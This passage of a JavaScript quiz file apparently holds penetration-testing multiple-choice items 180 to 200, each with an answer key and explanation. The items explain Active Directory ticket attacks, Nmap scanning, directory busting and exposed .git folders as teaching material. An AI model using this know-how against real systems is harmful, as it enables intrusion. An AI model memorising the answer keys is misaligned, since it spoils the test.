    "explanation": "PowerView is a PowerShell tool for situational awareness in Active Directory. It queries LDAP and AD APIs to enumerate users, computers, groups, domain trusts, administrative sessions, and unconstrained delegation."
  },
  {
    "id": 180,
    "question": "What open-source tool uses graph theory to reveal hidden, complex attack paths and relationship chains (e.g. user -> group -> local admin -> domain admin) in Active Directory?",
    "options": [
      "Mimikatz",
      "Metasploit",
      "Autopsy",
      "BloodHound"
    ],
    "answer": 3,
    "explanation": "BloodHound uses graph theory (powered by a Neo4j graph database) to visualize Active Directory relationships and identify non-obvious attack paths (e.g. derivative admin rights, ACL abuse) to reach Domain Admin."
  },
  {
    "id": 181,
    "question": "What Active Directory privilege escalation attack abuses 'Unconstrained Delegation' to harvest Kerberos Ticket Granting Tickets (TGTs) of domain administrators?",
    "options": [
      "Kerberos Unconstrained Delegation Attack",
      "Pass-the-Hash Attack",
      "Golden Ticket Attack",
      "AS-REP Roasting"
    ],
    "answer": 0,
    "explanation": "When a computer account has Unconstrained Delegation enabled, any user authenticating to it sends their full TGT inside the service ticket. If a Domain Admin connects, their TGT is stored in LSASS memory, where attackers dump it."
  },
  {
    "id": 182,
    "question": "What Active Directory attack requests authentication for user accounts that have 'Do not require Kerberos preauthentication' enabled, cracking the AS-REP response offline?",
    "options": [
      "Kerberoasting",
      "AS-REP Roasting",
      "Pass-the-Ticket",
      "Silver Ticket Attack"
    ],
    "answer": 1,
    "explanation": "If 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) is set on an account, any user can request a Kerberos AS-REP for that user from the DC. The encrypted ticket chunk is cracked offline with Hashcat (mode 18200) without alerting the target."
  },
  {
    "id": 183,
    "question": "What post-exploitation technique allows an attacker who extracted a Kerberos Ticket (TGT or TGS) from LSASS memory to inject it into their own session and authenticate to network shares?",
    "options": [
      "Pass-the-Hash (PtH)",
      "Pass-the-Password",
      "Pass-the-Ticket (PtT)",
      "Overpass-the-Hash"
    ],
    "answer": 2,
    "explanation": "Pass-the-Ticket (PtT) injects a stolen Kerberos ticket (Kirbi or ccache format) directly into the current logon session memory using tools like Mimikatz or Rubeus, allowing authentication without knowing the user's password or NTLM hash."
  },
  {
    "id": 184,
    "question": "What command line flag in Nmap sets the timing template to 'Insane' (timing 5) for ultra-fast port scanning on local high-bandwidth networks?",
    "options": [
      "-T4 (Aggressive)",
      "-T3 (Normal)",
      "-T0 (Paranoid)",
      "-T5"
    ],
    "answer": 3,
    "explanation": "Nmap timing templates range from -T0 (Paranoid - slowest, evades IDS) to -T5 (Insane - extremely fast, aggressive timeouts, used only on local gigabit networks where packet loss is low)."
  },
  {
    "id": 185,
    "question": "What Nmap flag instructs the scanner to conduct an 'OS Fingerprinting' scan to deduce the target operating system based on TCP/IP stack implementation quirks?",
    "options": [
      "-O",
      "-sV",
      "-A",
      "-sS"
    ],
    "answer": 0,
    "explanation": "The '-O' flag enables OS detection. Nmap sends a series of TCP and UDP probes with varying options (window size, IP ID, sequence numbers) and matches the response behavior against a database of thousands of OS fingerprints."
  },
  {
    "id": 186,
    "question": "What open-source vulnerability scanner originally forked from Nessus when Nessus became closed-source is maintained under the Greenbone Community Edition?",
    "options": [
      "Nmap",
      "OpenVAS (Open Vulnerability Assessment System)",
      "Nikto",
      "Metasploit"
    ],
    "answer": 1,
    "explanation": "OpenVAS was created in 2005 as an open-source fork of Nessus when Tenable switched to a proprietary license. It is now maintained by Greenbone as the core scanning component of the Greenbone Community Edition."
  },
  {
    "id": 187,
    "question": "What open-source web server vulnerability scanner written in Perl scans for dangerous files, outdated server software, and configuration problems across HTTP/HTTPS ports?",
    "options": [
      "Wireshark",
      "Afl-fuzz",
      "Nikto",
      "John the Ripper"
    ],
    "answer": 2,
    "explanation": "Nikto is a classic command-line web server scanner. It tests web servers for over 6,700 potentially dangerous files/programs, outdated server software versions, default files, and insecure CGI scripts."
  },
  {
    "id": 188,
    "question": "In web penetration testing, what is 'Directory Busting' (or Content Discovery)?",
    "options": [
      "Physically unscrewing and removing hard disk drives from corporate server racks",
      "Modifying file system cluster allocation tables using hex editors",
      "Formatting Apache web server installation directories using terminal scripts",
      "Brute-forcing URL paths using wordlists (e.g. gobuster, dirsearch, ffuf) to discover unlinked admin panels, hidden directories, and backup files"
    ],
    "answer": 3,
    "explanation": "Directory busting uses multi-threaded tools (gobuster, ffuf, feroxbuster) to request thousands of common file and directory names (e.g. '/admin/', '/backup.zip', '/.git/'), finding hidden endpoints that are not linked in HTML pages."
  },
  {
    "id": 189,
    "question": "What dangerous directory exposed on poorly configured production web servers allows an attacker to download the complete source code and commit history of a web application?",
    "options": [
      "/.git/ directory",
      "/.svn/ directory",
      "/cgi-bin/ directory",
      "/icons/ directory"
    ],
    "answer": 0,
    "explanation": "If developers deploy code by cloning a Git repository into the web root without blocking access to '/.git/', penetration testers use tools like 'git-dumper' to reconstruct the entire source code repository, commit logs, and hardcoded API keys."
  },
  {
    "id": 190,
    "question": "What open-source intelligence (OSINT) framework written in Python automates the gathering of employee emails, subdomains, employee names, and open ports from public sources?",
    "options": [
      "Maltego",
      "theHarvester",
      "Recon-ng",
      "SpiderFoot"
    ],
    "answer": 1,
    "explanation": "theHarvester is a popular OSINT reconnaissance tool that queries search engines, PGP key servers, LinkedIn, and Shodan to aggregate employee email addresses, names, subdomains, and IP ranges for a target company."
  },
  {
    "id": 191,
    "question": "In wireless security testing, what is a 'Rogue Access Point'?",
    "options": [
      "A commercial wireless router sold with a lifetime manufacturer hardware warranty",
      "A directional parabolic dish antenna used for long-distance Wi-Fi bridging",
      "An unauthorized wireless access point connected directly to a corporate internal network by an employee or attacker without administrative knowledge",
      "A software firewall that filters incoming wireless network frames"
    ],
    "answer": 2,
    "explanation": "A Rogue AP is an unauthorized wireless router plugged into an internal enterprise switch port (e.g. by an employee wanting personal Wi-Fi). It bypasses perimeter firewalls and 802.1X security, exposing the internal LAN to external radio attack."
  },
  {
    "id": 192,
    "question": "What 802.11 frame type is transmitted periodically by wireless Access Points to announce their presence, SSID, supported data rates, and encryption capabilities?",
    "options": [
      "Probe Request Frame",
      "Data Frame",
      "Acknowledgment (ACK) Frame",
      "Beacon Frame (802.11 Management Frame)"
    ],
    "answer": 3,
    "explanation": "Beacon frames are management frames broadcast periodically (~10 times per second) by APs. They contain the SSID, BSSID (MAC address), supported rates, and security capabilities (WPA2/WPA3 RSN Information Element)."
  },
  {
    "id": 193,
    "question": "What 802.11 frame is transmitted by client devices searching for known Wi-Fi networks, often broadcasting their complete history of previously connected SSIDs?",
    "options": [
      "Probe Request Frame",
      "Beacon Frame",
      "Association Response Frame",
      "Clear to Send (CTS) Frame"
    ],
    "answer": 0,
    "explanation": "When disconnected, smartphones broadcast Probe Requests asking for networks they previously connected to (e.g. 'Home_WiFi', 'Starbucks'). Passive listeners capture these frames to profile a user's travel and lifestyle history."
  },
  {
    "id": 194,
    "question": "In web security, what vulnerability occurs when an application validates user input only using client-side JavaScript in the browser?",
    "options": [
      "SQL Injection",
      "Client-Side Validation Bypass",
      "Cross-Site Scripting",
      "Buffer Overflow"
    ],
    "answer": 1,
    "explanation": "Client-side validation (HTML5 'required' or JS regex) is only for user convenience. Because attackers can intercept and modify HTTP requests in Burp Suite before they hit the server, input validation MUST be enforced server-side. (trivial to bypass using an intercepting proxy like Burp Suite or disabling JavaScript)"
  },
  {
    "id": 195,
    "question": "What penetration testing document specifies the exact target IP ranges, permitted testing hours, prohibited actions, emergency contact details, and scope boundaries?",
    "options": [
      "Non-Disclosure Agreement (NDA)",
      "Master Services Agreement (MSA)",
      "Rules of Engagement (RoE) / Scope Document",
      "Vulnerability Disclosure Policy (VDP)"
    ],
    "answer": 2,
    "explanation": "The Rules of Engagement (RoE) formalizes the operational parameters of a pentest: in-scope and out-of-scope assets, testing timeframes, forbidden denial-of-service tests, communication channels, and procedures if critical vulnerabilities are discovered."
  },
  {
    "id": 196,
    "question": "What attack technique manipulates HTTP request parameters by supplying multiple parameters with the exact same name (e.g. ?id=1&id=2) to confuse web application firewalls?",
    "options": [
      "Parameter Tampering",
      "Cross-Site Request Forgery",
      "Insecure Direct Object Reference",
      "HTTP Parameter Pollution (HPP)"
    ],
    "answer": 3,
    "explanation": "HPP occurs when multiple parameters of the same name are passed in a query. Different back-ends handle this differently (PHP takes the last; ASP.NET concatenates with a comma); attackers exploit this to bypass WAF filtering rules."
  },
  {
    "id": 197,
    "question": "What vulnerability occurs when an application transmits sensitive cryptographic keys or passwords in the URL query string of a GET request?",
    "options": [
      "Information Disclosure via URL Query String",
      "SQL Injection",
      "XML External Entity Injection",
      "Cross-Site Scripting"
    ],
    "answer": 0,
    "explanation": "Passing sensitive data (passwords, API tokens) in GET query strings (`/login?password=secret`) is insecure because URLs are logged in web server access logs, browser history, proxy caches, and transmitted in outbound 'Referer' headers. (logging in proxy, browser history, and Referer headers)"
  },
  {
    "id": 198,
    "question": "In cryptography, what is 'Side-Channel Attack'?",
    "options": [
      "An attack that cracks passwords by guessing alphabetical characters from right to left",
      "An attack based on information gained from the physical implementation of a computer system rather than theoretical flaws in the algorithm (e.g. timing, power, electromagnetic leaks)",
      "An attack that physically cuts fiber optic communication cables on the ocean floor",
      "An attack that uses social engineering to trick call center operators into resetting passwords"
    ],
    "answer": 1,
    "explanation": "Side-channel attacks exploit physical emissions during cryptographic execution: variations in execution time (timing attacks), power draw (DPA), electromagnetic radiation (TEMPEST), or sound (acoustic cryptanalysis) to deduce secret keys."
  },
  {
    "id": 199,
    "question": "What is the designated industry standard framework developed by MITRE that categorizes adversary tactics, techniques, and procedures (TTPs) based on real-world observations?",
    "options": [
      "OWASP Top 10",
      "NIST SP 800-53",
      "MITRE ATT&CK Framework",
      "ISO/IEC 27001"
    ],
    "answer": 2,
    "explanation": "MITRE ATT&CK is a globally accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) organized across the cyber attack lifecycle (Reconnaissance, Initial Access, Execution, Persistence, Privilege Escalation, Exfiltration)."
  },
  {
    "id": 200,
    "question": "What is the final, essential deliverable of an accredited Penetration Testing engagement?",
    "options": [
      "A video recording of the penetration tester executing commands in terminal",
      "A CSV spreadsheet listing only the open port numbers discovered by Nmap",
      "A certificate signed by the local municipal police commissioner certifying network safety",
      "A formal, comprehensive Penetration Testing Report containing an Executive Summary, detailed technical vulnerability findings with reproducible PoCs, CVSS risk ratings, and prioritized remediation guidance"
    ],
    "answer": 3,
    "explanation": "The final pentest report is the core deliverable. It provides executive leadership with business risk context and technical teams with detailed reproduction steps, CVSS scores, root-cause analyses, and actionable remediation instructions."
  }
];

if (typeof window !== 'undefined') {
  window.book5MCQs = book5MCQs;
}
if (typeof module !== 'undefined' && module.exports) {
  module.exports = book5MCQs;
}
